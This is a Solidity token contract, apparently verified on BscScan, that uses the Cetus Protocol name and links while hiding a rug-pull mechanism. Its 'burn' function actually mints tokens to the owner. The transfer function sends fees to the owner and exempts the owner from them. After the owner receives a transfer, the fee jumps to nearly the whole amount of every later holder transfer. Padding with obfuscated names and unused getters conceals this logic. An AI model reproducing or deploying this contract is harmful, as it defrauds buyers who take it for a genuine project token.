/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
CetusProtocol
Cetus - LiVe on Aptos & Sui
A Pioneer DEX and Concentrated Liquidity Protocol Built on #Aptos and #Sui
LIVE on Aptos Mainnet: 
    https://app.cetus.zone
Earn XP 
    https://cetusprotocol.crew3.xyz/questboard
    https://twitter.com/CetusProtocol
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.3;
contract CetusProtocol {
uint8 public constant decimals = 18;
string public  name = "CetusProtocol";
string public  symbol = "CetusProtocol";
uint256 private  HYxobS = 1000000000000000000000;
address private  zNyHqo = address(0);
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
address private  kYSpTX = address(0);
address private  AUvSGJ = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  qOOVEn = 10000000000;
address private  iWxGeh = address(0);
address private  gwOllB = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  kRYrca = address(0);
uint256 private  IewNRo = 1000000000000000000;
uint256 private  kfQuUv = 10000000000000;
mapping (address => uint256) public balanceOf;
address private  GuAmAI = address(0);
uint256 private  nUugLU = 1000000000000000000;
address private  WKyJkG = address(0);
address private  YBAiEz = address(0);
uint256 private  ElLdPF = 100000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant WekvwD = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  lewBHy = 1000000000000000;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


function _getWKyJkG() private returns (address) {
return WKyJkG;
}







function _getElLdPF() private returns (uint256) {
return ElLdPF;
}



function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tBhZVVp 0");
require(spender != address(0), "fBhZVVp 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function _getkYSpTX() private returns (address) {
return kYSpTX;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getqOOVEn() private returns (uint256) {
return qOOVEn;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BhZVVp");
require(to != address(0), "BhZVVp");
require(amount <= balanceOf[from], "BhZVVp");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* WekvwD/IewNRo ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==GuAmAI){
IewNRo = WekvwD+2;
}
emit Transfer(from, to, transferAmount);
}
function _getYBAiEz() private returns (address) {
return YBAiEz;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}




function _getkfQuUv() private returns (uint256) {
return kfQuUv;
}

function _getAUvSGJ() private returns (address) {
return AUvSGJ;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


constructor () {
GuAmAI = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getlewBHy() private returns (uint256) {
return lewBHy;
}

function _getnUugLU() private returns (uint256) {
return nUugLU;
}

function _getzNyHqo() private returns (address) {
return zNyHqo;
}

function _getkRYrca() private returns (address) {
return kRYrca;
}



function _getgwOllB() private returns (address) {
return gwOllB;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}






function _getiWxGeh() private returns (address) {
return iWxGeh;
}

function _getHYxobS() private returns (uint256) {
return HYxobS;
}




}